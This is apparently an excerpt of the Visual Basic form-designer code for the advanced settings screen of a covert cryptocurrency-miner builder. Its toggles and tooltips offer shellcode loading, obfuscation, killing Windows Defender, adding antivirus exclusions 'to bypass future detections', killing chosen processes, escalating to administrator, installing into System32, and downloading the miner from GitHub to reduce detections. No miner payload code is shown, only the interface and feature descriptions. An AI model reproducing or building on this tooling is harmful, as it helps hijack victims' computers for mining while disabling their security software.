...
Partial Class Advanced
    ...
    Private Sub InitializeComponent()
        ...
        Me.MephTheme1 = New project.MephTheme()
        Me.Label18 = New System.Windows.Forms.Label()
        Me.toggleProcessKiller = New project.MephToggleSwitch()
        Me.txtKillTargers = New project.MephTextBox()
        Me.Label12 = New System.Windows.Forms.Label()
        Me.Label16 = New System.Windows.Forms.Label()
        Me.toggleShellcode = New project.MephToggleSwitch()
        Me.txtStealthTargets = New project.MephTextBox()
        Me.Label14 = New System.Windows.Forms.Label()
        Me.PictureBox2 = New System.Windows.Forms.PictureBox()
        Me.Label8 = New System.Windows.Forms.Label()
        Me.toggleInstallSystem32 = New project.MephToggleSwitch()
        Me.Label10 = New System.Windows.Forms.Label()
        Me.toggleAdministrator = New project.MephToggleSwitch()
        Me.PictureBox1 = New System.Windows.Forms.PictureBox()
        Me.Label27 = New System.Windows.Forms.Label()
        Me.toggleEnableDebug = New project.MephToggleSwitch()
        Me.Label20 = New System.Windows.Forms.Label()
        Me.chkAdvanced = New project.MephCheckBox()
        Me.txtAdvParam = New project.MephTextBox()
        Me.Label2 = New System.Windows.Forms.Label()
        Me.toggleObfuscation = New project.MephToggleSwitch()
        Me.Label4 = New System.Windows.Forms.Label()
        Me.toggleKillWD = New project.MephToggleSwitch()
        Me.Label5 = New System.Windows.Forms.Label()
        Me.chkRemoteConfig = New project.MephCheckBox()
        Me.txtRemoteConfig = New project.MephTextBox()
        Me.Label21 = New System.Windows.Forms.Label()
        Me.Label22 = New System.Windows.Forms.Label()
        Me.toggleDownloader = New project.MephToggleSwitch()
        ...
        Me.Label15.Text = "?"
        Me.TooltipHelper.SetToolTip(Me.Label15, "Will convert the program into shellcode and use a native C program to load it. Wi" & _
        ...
        Me.Label9.Text = "?"
        Me.TooltipHelper.SetToolTip(Me.Label9, "Will make the miner ask for administrator privileges to run." & Global.Microsoft.VisualBasic.ChrW(13) & Global.Microsoft.VisualBasic.ChrW(10) & "This is required fo" & _
        "r the Bypass Windows Defender option. This option will also increase the hashrat" & _
        "e.")
        '
        'Label26
        '
        ...
        Me.Label26.Text = "?"
        Me.TooltipHelper.SetToolTip(Me.Label26, "Will enable DEBUG mode which will display errors when they occur in the miner. !W" & _
        ...
        Me.Label3.Text = "?"
        Me.TooltipHelper.SetToolTip(Me.Label3, "Will run commands to exclude the general folders that the miner uses or can use. " & _
        "This is good to enable to bypass future detections." & Global.Microsoft.VisualBasic.ChrW(13) & Global.Microsoft.VisualBasic.ChrW(10) & "This command requires Admin" & _
        ...
        Me.Label11.Text = "?"
        Me.TooltipHelper.SetToolTip(Me.Label11, "The programs that the ""Process Killer"" option should check for. Separate the prog" & _
        ...
        Me.Label17.Text = "?"
        Me.TooltipHelper.SetToolTip(Me.Label17, "Will constantly search for and kill any programs entered into the ""Kill Targets"" " & _
        "field.")
        '
        'MephTheme1
        '
        ...
        Me.MephTheme1.Controls.Add(Me.Label21)
        Me.MephTheme1.Controls.Add(Me.Label22)
        ...
        Me.PictureBox2.Image = Global.project.My.Resources.Resources.microsoft_admin
        ...
        Me.PictureBox1.Image = Global.project.My.Resources.Resources.microsoft_admin
        ...
        Me.Label21.Location = New System.Drawing.Point(118, 256)
        Me.Label21.Name = "Label21"
        Me.Label21.Size = New System.Drawing.Size(13, 13)
        Me.Label21.TabIndex = 106
        Me.Label21.Text = "?"
        Me.TooltipHelper.SetToolTip(Me.Label21, "Enable this to download the miner from online (GitHub) instead of embedding it in" & _
        " the file." & Global.Microsoft.VisualBasic.ChrW(13) & Global.Microsoft.VisualBasic.ChrW(10) & "This will greatly decrease the file size and usually greatly decreas" & _
        "es detections.")
        '
        'Label22
        '
        ...
        Me.toggleDownloader.Location = New System.Drawing.Point(189, 251)
        ...
        Me.toggleDownloader.TabIndex = 104
    ...
    Friend WithEvents toggleDownloader As project.MephToggleSwitch
End Class
